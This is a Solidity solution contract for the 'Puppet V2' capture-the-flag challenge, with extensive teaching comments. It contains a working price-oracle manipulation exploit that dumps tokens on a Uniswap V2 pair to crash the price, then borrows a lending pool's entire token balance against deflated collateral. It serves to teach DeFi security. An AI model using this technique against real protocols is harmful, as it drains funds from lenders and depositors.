// SPDX-License-Identifier: MIT
pragma solidity =0.6.6;

import { IERC20 } from "./Interfaces/IERC20.i.sol";
import { IWETH } from "./Interfaces/IWETH.i.sol";
import { IPuppetV2Pool } from "./Interfaces/IPuppetV2Pool.i.sol";
import { IUniswapV2Router02 } from "../helpers/uniswap-v2-solc0.6-puppetv2/IUniswapV2Router02.i.sol";
import { UniswapV2Library } from "@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol";

contract PuppetMasterV2 {
    address private player;
    address private uniswapFactory;
    IERC20 private token;
    IWETH private weth;
    IPuppetV2Pool private lendingPool;
    IUniswapV2Router02 private uniswapRouter;

    uint256 private constant UNISWAP_INITIAL_TOKEN_RESERVE = 100 * 1e18;
    uint256 private constant UNISWAP_INITIAL_WETH_RESERVE = 10 * 1e18;
    uint256 private constant PLAYER_INITIAL_TOKEN_BALANCE = 10000 * 1e18;
    uint256 private constant PLAYER_INITIAL_ETH_BALANCE = 20 * 1e18;
    uint256 private constant POOL_INITIAL_TOKEN_BALANCE = 1000000 * 1e18;

    constructor(
        address _lendingPool,
        address _uniswapRouter,
        address _token,
        address _weth,
        address _factory,
        address _player
    ) public payable {
        lendingPool = IPuppetV2Pool(_lendingPool);
        uniswapRouter = IUniswapV2Router02(_uniswapRouter);
        token = IERC20(_token);
        weth = IWETH(_weth);
        uniswapFactory = _factory;
        player = _player;
    }

    function solveChallenge() public {
        // The solidity version being 0.6.6 is simply to enable compilation with
        // the provided PuppetV2Pool. You do not necessarily need to take
        // advantage of any compiler differences between solidity v0.6 and v0.8.

        // It may be helpful to read how to trade tokens on Uniswap v2 using
        // the Uniswap Router contract. (Researching decentralized exchanges
        // and the Constant Product formula as well will help you understand
        // how pricing on Uniswap v2 works, if you're interested. It is not
        // at all necessary for this challenge.)

        // Informational, not necessary!
        // https://www.youtube.com/watch?v=wJGabFwttWI
        // https://www.youtube.com/watch?v=IL7cRj5vzEU

        // And as before, any tokens and ether given to the player have been
        // trasnfered into this contract. You must transfer all the tokens
        // and ether back to the player by the end of your solution in order
        // to pass the challenge.

        /*//////////////////////////////////////////////////////////////
                                    SOLUTION
        //////////////////////////////////////////////////////////////*/

        // As before, the solution to this challenge involves manipulating an
        // exchange using a price oracle. The challenge instructions seem to
        // imply that the issue with the previous Puppet Pool was the exchange
        // or the exchange's code. However, the actual issue is the act of
        // using an exchange as a price oracle at all, because anybody can
        // simply dump tokens onto the exchange in order to manipulate the
        // price. The vulnerability is one of economic incentives: if crashing
        // the price on the exchange costs less than the value that can be
        // stolen from a contract using the exchange as a price oracle, then an
        // attacker will happily spend the money to crash the exchange price.

        // 1. Convert all of our native ether to WETH, since that's what the
        // exchange and lending pool uses.
        weth.deposit{ value: address(this).balance }();

        // 2. Dump all of our DVT tokens onto the exchange so that the price
        // of DVT tokens is as low as possible. (This is where reading the
        // Uniswap docs and knowing how to use the Router comes in handy.)

        // Since the Uniswap swap functionality does not let us be lazy like
        // we were in the V1 attack, we must determine the exact amounts to
        // send and receive. We know we are sending all of our DVT tokens, so
        // the only number we need is the amount of WETH we expect in return.
        // We use the Uniswap Library to tell us the amount, which is based
        // on the ratio of its liquidity reserves for DVT and WETH.

        (uint256 token_reserves, uint256 weth_reserves) =
            UniswapV2Library.getReserves(uniswapFactory, address(token), address(weth));

        uint256 amountWethOut =
            UniswapV2Library.getAmountOut(token.balanceOf(address(this)), token_reserves, weth_reserves);

        // Don't forget to approve the router to transfer!
        token.approve(address(uniswapRouter), token.balanceOf(address(this)));

        // The swap function requires an array of the two token addresses
        address[] memory bothTokens = new address[](2);
        bothTokens[0] = address(token);
        bothTokens[1] = address(weth);

        // Actually, it turns out I lied. We could have been lazy and put 0
        // or 1 for amountWethOut.
        uniswapRouter.swapExactTokensForTokens(
            token.balanceOf(address(this)), amountWethOut, bothTokens, address(this), block.timestamp
        );

        // Once again, note that the use of block.timestamp allows a miner to
        // include/exclude this transaction when it is most profitable for
        // them to front-run and/or back-run it. A deadline of [current time
        // plus 15-20 min] is usually the most appropriate, because
        // it is soon enough to expire quickly, but long enough that is goes
        // outside of the accepted time drift for miners' timestamps.

        // Note also that if we didn't specify the exact amountWethOut, a miner
        // or MEV bot could front-run or sandwich-attach us and force us to
        // receives less weth than we expected. This could still happen even
        // with our use of the getReserves(), because the getReserves() call
        // is in the same transaction as the swap, so it will always return
        // the amount we will get, even if that amount is very low! In practice
        // the way trading works is we get the price before the transaction is
        // sent, and then subtract a little bit to account for normal small
        // price swings between the time we get the price and the time we
        // broadcast our transaction. This is usually referred to as "slippage"
        // and is usually between 0.2% and 5% of the amount we previously
        // priced. By submitting a trade for ~95% of the amount we expect, we
        // set a cap on how much we lose to MEV bots, as well as protect
        // ourself from a sudden market crash that happens just before we
        // submit our transaction.

        // 3. Now that we have crashed the price, we "borrow" all the pool's
        // DVT, remembering to approve the pool to transfer our weth.

        // approve
        weth.approve(address(lendingPool), weth.balanceOf(address(this)));

        // "borrow"
        lendingPool.borrow(token.balanceOf(address(lendingPool)));

        // 4. Convert any remainint WETH back to ether
        if (weth.balanceOf(address(this)) > 0) {
            weth.withdraw(weth.balanceOf(address(this)));
        }

        // 5. Transfer eth and tokens back to player
        (bool success,) = player.call{ value: address(this).balance }("");
        require(success, "eth transfer to player failed in puppet v2");
        token.transfer(player, token.balanceOf(address(this)));

        // Youtube walkthrough:
        // https://www.youtube.com/watch?v=F4kqItXHDb0
    }

    // The "payable" functionality and receive/fallback are provided for your
    // convenience. Feel free to alter them or to remove them if you don't use
    // them.
    receive() external payable { }
    fallback() external payable { }
}
